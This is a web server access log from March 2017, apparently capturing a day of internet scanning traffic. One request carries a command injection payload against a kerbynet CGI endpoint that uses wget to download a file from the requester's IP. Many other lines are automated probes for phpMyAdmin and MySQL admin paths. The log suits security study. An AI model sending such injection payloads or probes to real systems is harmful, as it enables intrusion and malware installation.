103.221.76.2 - - [12/Mar/2017:00:20:26 +0000] "GET / HTTP/1.1" 200 11197
139.162.108.53 - - [12/Mar/2017:00:57:26 +0000] "GET / HTTP/1.1" 200 11197
91.196.50.33 - - [12/Mar/2017:02:24:53 +0000] "GET /testproxy.php HTTP/1.1" 404 977
139.162.113.204 - - [12/Mar/2017:05:02:41 +0000] "GET / HTTP/1.1" 200 11197
113.225.214.211 - - [12/Mar/2017:05:30:52 +0000] "GET / HTTP/1.1" 200 11197
139.162.124.167 - - [12/Mar/2017:06:38:39 +0000] "GET / HTTP/1.1" 200 11197
216.218.206.67 - - [12/Mar/2017:12:32:02 +0000] "GET / HTTP/1.1" 200 11197
191.96.249.97 - - [12/Mar/2017:12:33:52 +0000] "GET / HTTP/1.1" 200 11197
191.96.249.97 - - [12/Mar/2017:13:48:13 +0000] "GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%26wget%20ttp://191.96.249.97/networkspeed%27 HTTP/1.1" 404 983
174.138.66.155 - - [12/Mar/2017:14:21:22 +0000] "HEAD / HTTP/1.1" 200 -
174.138.66.155 - - [12/Mar/2017:14:32:04 +0000] "HEAD / HTTP/1.1" 200 -
91.196.50.33 - - [12/Mar/2017:15:07:10 +0000] "GET /testproxy.php HTTP/1.1" 404 977
163.172.99.46 - - [12/Mar/2017:19:32:07 +0000] "GET /recordings/index.php HTTP/1.1" 404 991
163.172.99.46 - - [12/Mar/2017:19:32:07 +0000] "GET /recordings/index.php HTTP/1.1" 404 991
80.82.64.21 - - [12/Mar/2017:20:36:13 +0000] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 1033
80.82.64.21 - - [12/Mar/2017:20:36:13 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 1007
80.82.64.21 - - [12/Mar/2017:20:36:13 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 1007
80.82.64.21 - - [12/Mar/2017:20:36:13 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 993
80.82.64.21 - - [12/Mar/2017:20:36:14 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 1001
80.82.64.21 - - [12/Mar/2017:20:36:14 +0000] "GET /scripts/setup.php HTTP/1.1" 404 985
80.82.64.21 - - [12/Mar/2017:20:36:14 +0000] "GET /mysql/scripts/setup.php HTTP/1.1" 404 997
80.82.64.21 - - [12/Mar/2017:20:36:14 +0000] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 1007
46.17.143.30 - - [12/Mar/2017:22:08:03 +0000] "HEAD /mysql/admin/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:03 +0000] "HEAD /mysql/sqlmanager/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:03 +0000] "HEAD /mysql/mysqlmanager/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:04 +0000] "HEAD /phpmyadmin/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:04 +0000] "HEAD /phpMyadmin/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:04 +0000] "HEAD /phpMyAdmin/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:04 +0000] "HEAD /phpmyAdmin/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:05 +0000] "HEAD /phpmyadmin2/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:05 +0000] "HEAD /phpmyadmin3/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:05 +0000] "HEAD /phpmyadmin4/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:06 +0000] "HEAD /2phpmyadmin/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:06 +0000] "HEAD /phpmy/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:06 +0000] "HEAD /phppma/ HTTP/1.1" 404 -
46.17.143.30 - - [12/Mar/2017:22:08:10 +0000] "HEAD /shopdb/ HTTP/1.1" 404 -
